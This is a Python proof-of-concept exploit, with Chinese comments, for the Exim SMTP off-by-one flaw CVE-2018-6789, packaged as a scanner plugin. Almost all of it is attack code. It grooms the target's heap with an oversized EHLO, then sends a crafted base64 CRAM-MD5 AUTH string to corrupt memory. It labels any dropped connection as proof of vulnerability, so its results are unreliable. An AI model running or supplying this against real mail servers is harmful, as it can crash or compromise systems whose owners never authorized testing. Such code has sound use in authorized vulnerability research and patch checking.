#已验证

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import smtplib
from base64 import b64encode
import sys

class DemoPOC:
    appName = 'Exim'  # 漏洞影响的应用或组件名称
    appVersion = '4.x'  # 漏洞影响版本
    install_requires = []  # 需要的库
    CVE_ID = "CVE-2018-6789"  # CVE编号
    Vul_name = "Exim SMTP Server Off-by-one Remote Code Execution"  # 漏洞名称
    Type = "远程代码执行"  # 漏洞类型
    Description = "Exim邮件服务器中的CVE-2018-6789漏洞是由于SMTP服务处理AUTH命令时的off-by-one错误，导致远程攻击者通过特定请求进行代码执行。"  # 漏洞描述
    Script_type = "python"  # POC类型
    Script = "CVE_2018_6789.py"  # POC文件名
    Vul_Date = "2018-02-04"  # 漏洞公开日期

    def __init__(self, url, ip, port):
        self.url = url
        self.ip = ip
        self.port = port

    def check_and_install_dependencies(self):
        """检查并安装所需的库"""
        return True  # 由于此POC没有额外库依赖，直接返回True

    def _exploit(self):
        """利用漏洞进行攻击"""
        result = {}
        try:
            print("Checking for CVE-2018-6789 vulnerability on Exim server...")

            s = smtplib.SMTP(self.ip, self.port)

            # Step 1: Put a huge chunk into unsorted bin
            s.ehlo("mmmm" + "b" * 0x1500)

            # Step 2: Send base64 data and trigger off-by-one
            s.docmd("AUTH CRAM-MD5")
            payload = "d" * (0x2008 - 1)
            s.docmd(b64encode(payload.encode()).decode() + b64encode(b'\xf1\xf1').decode()[:-1])

            s.quit()
        except smtplib.SMTPServerDisconnected:
            result['VerifyInfo'] = "[!] Exim server is vulnerable to CVE-2018-6789."
        except Exception as e:
            result['Error'] = f"[ERROR] Failed to execute the POC: {e}"

        return result

    def _verify(self):
        """验证漏洞是否存在"""
        result = {}
        try:
            # 检查依赖库
            if not self.check_and_install_dependencies():
                result['Error'] = "[ERROR] 依赖库安装失败"
                return result

            # 执行漏洞利用
            exploit_result = self._exploit()
            if 'Error' in exploit_result:
                result['Error'] = exploit_result['Error']
            else:
                result['VerifyInfo'] = exploit_result.get('VerifyInfo', "[SAFE] No vulnerability found.")
        except Exception as e:
            result['Error'] = f"[ERROR] 执行POC过程中发生错误: {str(e)}"

        return result


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python CVE_2018_6789.py <url> <ip> <port>")
        sys.exit(1)

    url = sys.argv[1]
    ip = sys.argv[2]
    port = int(sys.argv[3])

    poc = DemoPOC(url, ip, port)
    result = poc._verify()
    print(result['VerifyInfo'] if 'VerifyInfo' in result else result['Error'])
